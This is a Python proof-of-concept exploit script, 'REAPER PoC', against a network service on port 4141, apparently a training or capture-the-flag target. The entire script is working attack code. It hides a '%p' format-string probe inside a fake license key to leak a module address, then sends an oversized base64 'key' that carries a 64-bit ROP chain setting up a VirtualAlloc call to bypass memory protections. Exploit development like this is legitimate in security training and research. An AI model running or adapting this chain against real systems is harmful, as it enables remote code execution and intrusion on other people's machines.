#!/usr/bin/python
import socket, sys, base64
from struct import pack

global server
global port
global s
global base_address

def main():
    global server
    global port
    global s
    global base_address
    
    server = sys.argv[1]
    port = 4141

    print("REAPER PoC\n----------")
    print("[*] Connecting to: %s" % server)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    leaked_address = leak_address()
    print("[*] Leaked address: %s" % hex(int(leaked_address,16)))

    base_address = int(leaked_address, 16)- 0x20660
    print("[*] Module base address: %s" % hex(base_address))

    print("[*] Sending the exploit...")
    send_exploit()

    s.close()


def leak_address():
    # recv initial menu
    d = s.recv(1024)

    # send option 1 data
    s.send(b'1')
    d = s.recv(1024)

    leak_str = b"%p1-FE9A1-500-A270-0155-U3RhbmRhcmQgTGljZW5zZQ=="
    s.send(leak_str)

    # recv menu
    d = s.recv(1024)

    # send option 2 data
    s.send(b'2')

    d = s.recv(1024)
    d = s.recv(1024)

    # it works OK!
    retn = d.decode('utf-8').split(':')[1][1:17]

    return retn


def send_exploit():
    global s
    global base_address

    # send option 1 data
    s.send(b'1')
    d = s.recv(1024)

    # key
    buffer = b"A" * 88                                  # padding

    # flProtect - r9
    # ---------------------------------------------------------------------------------
    buffer += pack("<Q", base_address + 0x1f5e7)        # pop rbx ; ret ;
    buffer += pack("<Q", 0x40)                          # 0x40
    buffer += pack("<Q", base_address + 0x1f90)         # mov r9, rbx ; mov r8, 0x0000000000000000 ; # add rsp, 0x08 ; ret ;
    buffer += b"B" * 0x8                                # padding for add rsp, 0x08

    # flAllocationType - r8
    # ---------------------------------------------------------------------------------
    buffer += pack("<Q", base_address + 0x1f5e7)         # pop rbx ; ret ;
    buffer += pack("<Q", 0x1000)                         # 0x1000
    buffer += pack("<Q", base_address + 0x1f90)          # mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;
    buffer += b"B" * 0x8                                 # padding for add rsp, 0x08
    buffer += pack("<Q", base_address + 0x3918)          # add r8, r9 ; add rax, r8 ; ret ;

    # VirtualAlloc call - rax (will call rax later)
    # ---------------------------------------------------------------------------------
    buffer += pack("<Q", base_address + 0x150a)         # pop rax ; ret ;
    buffer += pack("<Q", base_address + 0x20000)        # VirtualAlloc IAT address
    buffer += pack("<Q", base_address + 0x1547f)        # mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
    buffer += b"B" * 0x28                               # padding for add rsp, 0x28
    # rax contains the address of VirtualAlloc

    # dwSize - rdx
    # ---------------------------------------------------------------------------------
    buffer += pack("<Q", base_address + 0x14625)        # pop r13 ; ret ;
    buffer += pack("<Q", 0x1000)                        # 0x40
    buffer += pack("<Q", base_address + 0x368f)         # mov rdx, r13 ; call rax ;

    # Test stuff, can be removed later
    # ---------------------------------------------------------------------------------
    buffer += pack("<Q", base_address + 0x12c7)         # mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
    buffer += pack("<Q", base_address + 0x12c7)         # mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
    buffer += pack("<Q", base_address + 0x12c7)         # mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
    buffer += pack("<Q", base_address + 0x12c7)         # mov rax, qword [rax] ; add rsp, 0x28 ; ret ;

    key = base64.b64encode(buffer)

    # send key
    poc_str = b"100-FE9A1-500-A270-0102-" + key
    s.send(poc_str)

    # recv menu
    d = s.recv(1024)

    # send option 2 data
    s.send(b'2')
    
    d = s.recv(1024)
    d = s.recv(1024)

# start here
main()
